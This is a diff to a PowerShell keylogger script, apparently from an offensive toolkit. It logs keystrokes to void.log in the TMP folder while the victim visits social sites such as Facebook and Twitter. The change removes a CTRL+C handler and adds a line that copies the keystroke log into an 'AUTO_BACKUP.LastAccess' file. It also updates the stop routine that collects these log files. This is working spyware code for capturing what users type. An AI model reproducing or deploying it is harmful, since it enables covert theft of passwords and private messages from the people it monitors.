@@ -244,21 +244,8 @@ If($Action -iMatch '^(start)$')
                   Start-Sleep -Milliseconds 1600 # Give extra time for execution
                }
 
-               ## Prevent CTRL+C to brake logfile creation
-               # while the logfile its still beeing writen.
-               [console]::treatcontrolcasinput = $true
-               If([console]::keyavailable)
-               {
-                  $key = [system.console]::readkey($true)
-                  If(($key.modifiers -band [consolemodifiers]"control") -and ($key.key -eq "c"))
-                  {
-                     ## BackUp void.log (keystrokes logfile) because terminal console recieved CTRL+C command! 
-                     Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.${SocialSite}" -force
-                     exit  ## Exit then ..
-                  }
-               }
-
                write-host "   > key`logger running in background!"
+               Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.LastAccess" -force
             }
             Else
             {
@@ -332,7 +319,7 @@ If($Action -iMatch '^(stop)$')
    }
 
 
-   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'AUTO_BACKUP.'    
+   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'.LastAccess'    
    If(-not([string]::IsNullOrEmpty($GetLogNames)))
    {
       ForEach($Report in $GetLogNames)
